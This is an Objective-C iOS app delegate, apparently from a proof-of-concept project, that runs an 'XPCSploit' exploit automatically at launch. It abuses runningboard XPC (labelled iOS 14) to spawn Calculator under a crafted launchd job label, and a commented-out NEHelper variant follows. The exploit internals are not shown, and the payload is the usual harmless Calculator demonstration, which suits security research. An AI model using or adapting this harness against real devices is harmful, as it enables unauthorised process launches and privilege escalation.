#import <UIKit/UIKit.h>

#import "XPCAppDelegate.h"
#import "XPCRootViewController.h"
#import "XPCSploit.h"

extern const char **environ;

@implementation XPCAppDelegate

- (NSString*)jobLabel {
        NSUserDefaults *standardDefaults = [NSUserDefaults standardUserDefaults]; 
        NSString* executablePath = [standardDefaults stringForKey:@"exec"]; // Get our app's executable path
        NSMutableDictionary* appInfo = [[NSMutableDictionary alloc] initWithContentsOfFile:[NSString stringWithFormat:@"%@/Info.plist", [executablePath stringByDeletingLastPathComponent]]];
        NSString const* bundleId = [appInfo objectForKey:@"CFBundleIdentifier"]; // Read and return out app's bundle id
        NSUUID *uuid = [NSUUID UUID];
        return [NSString stringWithFormat:@"%@-%@",bundleId,uuid]; // Launchd compatible job label
}


// Run the exploit and return true on success
- (BOOL)runXPCExploit:(NSError**)error {
	return RunningBoardLauncher(CALCULATOR_PATH_IOS16, "com.apple.calculator",
        [self jobLabel].UTF8String, "/tmp/stdout",
        "/tmp/stderr", environ, "iOS 14 runningboard XPC");
//        return NEHelperLauncher(CALCULATOR_PATH_IOS16, "com.apple.calculator");
}


- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
        _window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
        _rootViewController = [[UINavigationController alloc] initWithRootViewController:[[XPCRootViewController alloc] init]];
        _window.rootViewController = _rootViewController;
        [_window makeKeyAndVisible];
	[self runXPCExploit:nil];
        return YES;
}

@end
